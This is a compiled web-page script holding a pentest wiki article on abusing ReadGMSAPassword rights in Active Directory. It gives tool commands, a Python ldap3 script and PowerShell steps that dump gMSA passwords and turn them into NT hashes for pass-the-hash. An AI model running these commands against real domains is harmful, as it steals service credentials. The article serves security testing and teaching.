import{_ as k,c as r,j as s,a as i,G as e,w as t,B as h,o as d}from"./chunks/framework.B5CpDqM0.js";const m=JSON.parse('{"title":"ReadGMSAPassword","description":"","frontmatter":{"authors":"CravateRouge, PfiatDe, ShutdownRepo"},"headers":[],"relativePath":"ad/movement/dacl/readgmsapassword.md","filePath":"ad/movement/dacl/readgmsapassword.md","lastUpdated":1724982529000}'),p={name:"ad/movement/dacl/readgmsapassword.md"};function o(g,a,E,c,F,y){const l=h("PluginTabsTab"),n=h("PluginTabs");return d(),r("div",null,[a[2]||(a[2]=s("h1",{id:"readgmsapassword",tabindex:"-1"},[i("ReadGMSAPassword "),s("a",{class:"header-anchor",href:"#readgmsapassword","aria-label":'Permalink to "ReadGMSAPassword"'},"​")],-1)),a[3]||(a[3]=s("p",null,[i("This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's "),s("code",null,"msDS-GroupMSAMembership"),i(" attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.")],-1)),a[4]||(a[4]=s("p",null,"The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.",-1)),e(n,null,{default:t(()=>[e(l,{label:"UNIX-like"},{default:t(()=>a[0]||(a[0]=[s("p",null,[i("On UNIX-like systems, "),s("a",{href:"https://github.com/micahvandeusen/gMSADumper",target:"_blank",rel:"noreferrer"},"gMSADumper"),i(" (Python) can be used to read and decode gMSA passwords. It supports cleartext NTLM, pass-the-hash and Kerberoas authentications.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"gMSADumper.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain.local'")])])])],-1),s("p",null,[s("strong",null,"Alternative 1"),i(": Impacket's "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx"),i(" (Python) tool can be used to read and decode gMSA passwords. ⚠️ Some tests showed ntlmrelayx missed entries gMSADumper didn't.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ldaps://10.0.0.5"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -debug"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --dump-gmsa"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --no-dump"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --no-da"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --no-acl"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --no-validate-privs")])])])],-1),s("div",{class:"tip custom-block"},[s("p",null,[i("In order to easily fake a relayed authentication, once the relay servers are up and running, the tester can browse "),s("a",{href:"http://127.0.0.1/",target:"_blank",rel:"noreferrer"},"http://127.0.0.1/"),i(" in order to trigger a basic authentication that will then be relayed by ntlmrelayx, like "),s("a",{href:"https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96",target:"_blank",rel:"noreferrer"},"this"),i(".")])],-1),s("hr",null,null,-1),s("p",null,[s("strong",null,"Alternative 2"),i(": The "),s("code",null,"msDS-ManagedPassword"),i(" attribute can also be manually obtained by running the following Python script. The "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L672-L702",target:"_blank",rel:"noreferrer"},"following Python code"),i(" can then be used to decode the blob.")],-1),s("div",{class:"language-python vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"python"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ldap3")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"target_dn "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' ""'),s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}}," # something like 'CN=Target User,OU=Standard Accounts,DC=domain,DC=local'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"username "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "username"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{}\\\\{}"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".format(domain, username)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "password"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"server "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ldap3.Server(domain)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"connection "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ldap3.Connection("),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"server"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," ="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," server, "),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"user"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," ="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user, "),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"password"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," ="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," password, "),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"authentication"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," ="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ldap3."),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"NTLM"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"connection.bind()")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"connection.search(target_dn, "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'(&(ObjectClass=msDS-GroupManagedServiceAccount))'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},", "),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"search_scope"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ldap3."),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SUBTREE"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},", "),s("span",{style:{"--shiki-light":"#E36209","--shiki-dark":"#FFAB70"}},"attributes"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"["),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'sAMAccountName'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'msDS-ManagedPassword'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"])")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(connection.entries)")])])])],-1),s("hr",null,null,-1),s("p",null,[s("strong",null,"Alternative 3"),i(": Using "),s("a",{href:"https://github.com/CravateRouge/bloodyAD",target:"_blank",rel:"noreferrer"},"bloodyAD"),i(" (Python)")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --host"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," get"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TargetObject "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--attr"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," msDS-ManagedPassword")])])])],-1)])),_:1}),e(l,{label:"Windows"},{default:t(()=>a[1]||(a[1]=[s("p",null,"On Windows systems, there are multiple ways to read gMSA passwords.",-1),s("p",null,"The first one uses the Active Directory and DSInternals PowerShell modules.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Save the blob to a variable")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$gmsa = Get-ADServiceAccount -Identity "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'Target_Account'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," -Properties "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'msDS-ManagedPassword'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$mp = $gmsa."),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'msDS-ManagedPassword'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Decode the data structure using the DSInternals module")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ConvertFrom-ADManagedPasswordBlob"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $mp")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Build a NT-Hash for PTH")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ConvertFrom-ADManagedPasswordBlob"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $mp)"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},".SecureCurrentPassword"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," ConvertTo-NTHash")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Alterantive: build a Credential-Object with the Plain Password")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$cred = new-object system.management.automation.PSCredential "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Domain\\Target_Account"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},",("),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ConvertFrom-ADManagedPasswordBlob"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $mp).SecureCurrentPassword")])])])],-1),s("p",null,[i("The second one relies on "),s("a",{href:"https://github.com/rvazarkar/GMSAPasswordReader",target:"_blank",rel:"noreferrer"},"GMSAPasswordReader"),i(" (C#).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"."),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"\\"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"GMSAPasswordReader.exe"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --AccountName"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Target_Account'")])])])],-1)])),_:1})]),_:1}),a[5]||(a[5]=s("h2",{id:"resources",tabindex:"-1"},[i("Resources "),s("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),a[6]||(a[6]=s("p",null,[s("a",{href:"https://cube0x0.github.io/Relaying-for-gMSA/",target:"_blank",rel:"noreferrer"},"https://cube0x0.github.io/Relaying-for-gMSA/")],-1))])}const b=k(p,[["render",o]]);export{m as __pageData,b as default};
